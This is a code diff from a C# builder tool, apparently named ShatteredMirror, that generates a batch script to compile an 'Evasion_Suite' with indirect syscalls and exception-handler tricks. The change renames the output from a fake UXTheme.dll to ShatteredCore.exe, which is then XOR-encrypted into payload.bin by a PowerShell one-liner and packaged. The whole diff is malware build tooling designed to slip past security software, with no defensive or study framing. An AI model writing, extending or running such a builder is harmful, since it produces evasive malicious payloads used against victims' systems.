@@ -244,17 +244,16 @@ namespace ShatteredMirror_Builder
             sb.AppendLine("if not exist \"%VS_PATH%\" ( echo [!] VS Build Tools not found! && exit /b 1 )");
             sb.AppendLine("call \"%VS_PATH%\"");
             sb.AppendLine("");
-            sb.AppendLine("echo [*] Compiling Shattered Mirror DLL (UXTheme.dll)...");
+            sb.AppendLine("echo [*] Compiling Shattered Mirror CORE (ShatteredCore.exe)...");
             sb.AppendLine("ml64 /c /Fo Evasion_Suite\\IndirectSyscalls.obj Evasion_Suite\\IndirectSyscalls.asm");
-            sb.AppendLine("cl.exe /EHsc /O2 /GS- /LD /I Evasion_Suite\\include ^");
+            sb.AppendLine("cl.exe /EHsc /O2 /GS- /I Evasion_Suite\\include ^");
             sb.AppendLine("Orchestrator\\ProxyLogic.cpp Orchestrator\\VEH_Handler.cpp Orchestrator\\AtomManager.cpp Orchestrator\\IPC_Channel.cpp ^");
             sb.AppendLine("Evasion_Suite\\src\\*.cpp Atoms\\*.cpp Evasion_Suite\\IndirectSyscalls.obj ^");
             sb.AppendLine("advapi32.lib winhttp.lib bcrypt.lib user32.lib shell32.lib ^");
-            sb.AppendLine("/Fe:UXTheme.dll /link /IMPLIB:UXTheme.lib");
+            sb.AppendLine("/Fe:ShatteredCore.exe");
             sb.AppendLine("");
-            sb.AppendLine("echo [*] Encrypting Payload (UXTheme.dll -^> payload.bin)...");
-            // Robust PowerShell XOR: Convert key to bytes first and perform perfect math.
-            sb.AppendLine($"powershell -NoProfile -Command \"$b=[IO.File]::ReadAllBytes('UXTheme.dll');$k=[Text.Encoding]::ASCII.GetBytes('{payloadXorKey}');for($i=0;$i -lt $b.Length;$i++){{$b[$i]=$b[$i] -bxor $k[$i %% $k.Length]}};[IO.File]::WriteAllBytes('payload.bin',$b)\"");
+            sb.AppendLine($"echo [*] Encrypting Payload (ShatteredCore.exe -> payload.bin)...");
+            sb.AppendLine($"powershell -NoProfile -Command \"$b=[IO.File]::ReadAllBytes('ShatteredCore.exe');$k=[Text.Encoding]::ASCII.GetBytes('{payloadXorKey}');for($i=0;$i -lt $b.Length;$i++){{$b[$i]=$b[$i] -bxor $k[$i %% $k.Length]}};[IO.File]::WriteAllBytes('payload.bin',$b)\"");
             sb.AppendLine("");
             sb.AppendLine("if not exist \"payload.bin\" ( echo [!] FAILED: payload.bin missing! && exit /b 1 )");
             sb.AppendLine("echo [*] Packaging Resources...");
